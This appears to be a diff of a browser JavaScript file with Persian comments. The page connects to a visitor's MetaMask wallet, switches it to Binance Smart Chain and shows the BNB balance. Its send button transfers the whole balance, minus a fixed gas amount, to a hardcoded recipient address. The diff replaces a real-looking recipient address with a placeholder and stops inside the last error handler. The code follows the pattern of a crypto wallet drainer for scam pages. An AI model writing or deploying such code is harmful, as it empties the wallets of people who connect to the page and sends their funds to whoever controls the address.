@@ -1,18 +1,4 @@
-import { WalletConnectModal } from "@walletconnect/modal";
-import WalletConnectEthereumProvider from "@walletconnect/ethereum-provider";
 import { ethers } from "ethers";
-
-// پیکربندی WalletConnect با RPC برای شبکه BSC
-const providerOptions = {
-  walletconnect: {
-    package: WalletConnectEthereumProvider,
-    options: {
-      rpc: {
-        56: "https://bsc-dataseed.binance.org/"
-      }
-    }
-  }
-};
 
 let provider, signer, walletAddress;
 
@@ -22,64 +8,99 @@ const sendTransactionButton = document.getElementById("sendTransactionButton");
 const walletAddressElement = document.getElementById("walletAddress");
 const bnbBalanceElement = document.getElementById("bnbBalance");
 
-// ایجاد modal برای اتصال
-const modal = new WalletConnectModal({
-  projectId: "4d08946e6c316bed5e76b450ccbb5256",    // ← شناسه پروژه‌ی WalletConnect خود را اینجا وارد کنید
-  providerOptions,
-  cacheProvider: true
-});
+// تابعی برای سوئیچ به BSC (chainId = 56) در متامسک
+async function switchToBSC() {
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x38" }], // 0x38 = 56
+    });
+  } catch (switchError) {
+    // اگر BSC روی متامسک اضافه نشده بود، اضافه‌ش کن
+    if (switchError.code === 4902) {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [
+          {
+            chainId: "0x38",
+            chainName: "Binance Smart Chain",
+            nativeCurrency: {
+              name: "BNB",
+              symbol: "BNB",
+              decimals: 18,
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"],
+          },
+        ],
+      });
+    } else {
+      throw switchError;
+    }
+  }
+}
 
-// رویداد کلیک روی دکمه اتصال
+// کلیک روی دکمه اتصال
 connectButton.addEventListener("click", async () => {
   try {
-    // باز کردن modal و متصل شدن به کیف پول
-    provider = await modal.connect();
-    signer = provider.getSigner();
-    walletAddress = await signer.getAddress();
+    if (!window.ethereum) {
+      alert("لطفاً ابتدا افزونه MetaMask را نصب و فعال کنید.");
+      return;
+    }
 
-    // نمایش آدرس
+    // درخواست دسترسی به حساب‌ها
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+
+    // سوئیچ به شبکه BSC
+    await switchToBSC();
+
+    // ساخت provider و signer
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+
+    // خواندن آدرس و نمایش
+    walletAddress = await signer.getAddress();
     walletAddressElement.textContent = `آدرس کیف پول: ${walletAddress}`;
 
-    // دریافت و نمایش موجودی BNB
+    // خواندن موجودی BNB و نمایش
     const balance = await signer.getBalance();
     const bnbBalance = ethers.utils.formatEther(balance);
     bnbBalanceElement.textContent = `موجودی BNB: ${bnbBalance}`;
 
-    // نمایش دکمه ارسال تراکنش
+    // نمایش دکمه‌ی ارسال تراکنش
     sendTransactionButton.style.display = "inline-block";
   } catch (error) {
-    console.error("خطا در اتصال به کیف پول:", error);
-    alert("اتصال به کیف پول ناموفق بود.");
+    console.error("خطا در اتصال به متامسک:", error);
+    alert("اتصال به کیف پول متامسک ناموفق بود.");
   }
 });
 
-// رویداد کلیک روی دکمه ارسال تراکنش
+// کلیک روی دکمه ارسال تراکنش
 sendTransactionButton.addEventListener("click", async () => {
   try {
-    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // آدرس مقصد خود را اینجا وارد کنید
+    const recipientAddress = "0x1234567890abcdef1234567890abcdef12345678";  // ← اینجا آدرس مقصد را قرار دهید
 
-    // دریافت موجودی کل
+    // گرفتن موجودی کل
     const balance = await signer.getBalance();
 
-    // هزینه گس ثابت: 0.001 BNB
+    // هزینه ثابت گس: 0.001 BNB
     const gasFee = ethers.utils.parseEther("0.001");
 
-    // چک موجودی کافی
+    // بررسی موجودی کافی
     if (balance.lt(gasFee)) {
-      alert("موجودی کیف پول برای پرداخت gas کافی نیست!");
+      alert("موجودی کیف پول برای پرداخت گس کافی نیست!");
       return;
     }
 
-    // محاسبه باقی‌مانده پس از کسر گس
+    // مقدار قابل ارسال
     const amountToSend = balance.sub(gasFee);
 
     // ارسال تراکنش
     const tx = await signer.sendTransaction({
       to: recipientAddress,
-      value: amountToSend
+      value: amountToSend,
     });
 
-    // منتظر تایید تراکنش
     await tx.wait();
     alert("تراکنش با موفقیت ارسال شد!");
   } catch (error) {
